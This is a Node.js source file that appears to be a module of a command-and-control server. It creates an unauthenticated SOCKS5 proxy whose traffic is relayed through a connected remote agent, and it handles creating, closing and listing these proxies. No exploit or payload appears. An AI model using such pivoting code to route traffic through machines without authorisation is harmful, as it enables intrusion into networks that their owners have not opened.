const { v4: uuidv4 } = require('uuid');
const DEBUG = false;
var socks = require('socksv5');
var socksProxies = [];

module.exports = {
    handlers: [
        {   //Write to Socks Proxy connection
            returnType: 7,
            handle: (scope, message) => {
                var cust = scope.customers.find(c => c.socketId == scope.socket.id);
                if(!cust) return;
                if(DEBUG) console.log("Recieving: " );
                data = Buffer.from(message.output.data, 'base64');

                var proxy = socksProxies[cust.id];
                if(!proxy) return false;

                var connection = proxy.sockets[message.output.connectionId];
                if(connection){
                    connection.write(data);
                    if(DEBUG) console.log(message.output.connectionId + " : " + data);
                }
                return false;
            }
        },
        {   //Initialize
            returnType: 8,
            handle: (scope, msg) => {
                
                var cust = scope.customers.find(c => c.socketId == scope.socket.id);
                if(!cust){
                    return false;
                }

                var coolServer = socksProxies[cust.id]
                if(!coolServer || coolServer.jobId){
                    return false;  //Either not a valid server or already created
                }

                coolServer.jobId = msg.output.jobId.toString();
                scope.controllers.emit('echo', `Socks proxy is initialized and running on port: ${coolServer.port}`);
            }
        }
    ],
    listeners:[
        {
            name: 'create-socks-server',
            handle: (scope, msg) => {
                var cust = scope.customers.find(c => c.id == msg.id);

                if(cust){
                    
                    if(socksProxies[msg.id]){
                        scope.socket.emit('echo', 'Socks Proxy already exists for specified agent');
                        return;
                    }
                    var srv = socks.createServer(function(info, accept, deny) {
                        
                        var proxy = Object.values(socksProxies).find(p => p.server == this);
                        if(!proxy.jobId) {
                            deny();
                            return;
                        }

                        var socket = accept(true);
                        var id = uuidv4();
                        proxy.sockets[id] = socket;

                        socket.on("data", data => {
                            if(DEBUG) console.log("Writing: " + id + " : " + data.toString());
    
                            scope.clients.to(cust.socketId).emit("add-job-data", { 
                                id: proxy.jobId,
                                connection_id: id,
                                host: info.dstAddr,
                                port: info.dstPort.toString(),
                                data: data.toString('base64') });
                        });
                    
                        socket.on("end", () => {
                            var coolProx = socksProxies[proxy.custId];
                            if(coolProx){
                                coolProx.sockets[id] = null;
                                scope.clients.to(cust.socketId).emit("add-job-data", { 
                                    id: proxy.jobId,
                                    connection_id: id,
                                });
                            }  
                        });
    
                        socket.on("error", console.log);

                    });
                    srv.listen(msg.args[0], console.log('SOCKS server listening on port ' + msg.args[0]));
                    srv.useAuth(socks.auth.None());
                    socksProxies[msg.id] = {
                        custId: msg.id,
                        jobId: null,
                        server: srv,
                        port: msg.args[0],
                        sockets: []
                    }

                    scope.clients.to(cust.socketId).emit("run-stream", ["Socksproxy"]);

                    scope.socket.emit('echo', 'Socks proxy initiated, awaiting job creation');
                }else{
                    scope.socket.emit('echo', 'Invalid client');
                }
            }
        },
        {
            name: 'close-socks-server',
            handle: (scope, msg) => {

                var server = Object.values(socksProxies).find(c => c.port == msg.args[0]);
                if(!server){
                    scope.socket.emit('echo', 'Server does not exist');
                    return;
                }
                
                var cust = scope.customers.find(c => c.id == msg.id);
                if(cust){
                    scope.clients.to(cust.socketId).emit("kill-job", [server.jobId]);
                    server.server.close();
                    delete socksProxies[cust.id];
                    scope.socket.emit('echo', `Server port ${msg.args[0]} closed`);
                }else{
                    scope.socket.emit('echo', 'Invalid client');
                }
            }
        },
        {
            name: 'get-socks-servers',
            handle: (scope, msg) => {
                var connections = Object.keys(socksProxies);
                if(connections.length){
                    connections.forEach(c => scope.socket.emit('echo', `${c} ${socksProxies[c].port}`));
                }else{
                    scope.socket.emit('echo', 'No existing connections');
                }
            }
        }
    ]

}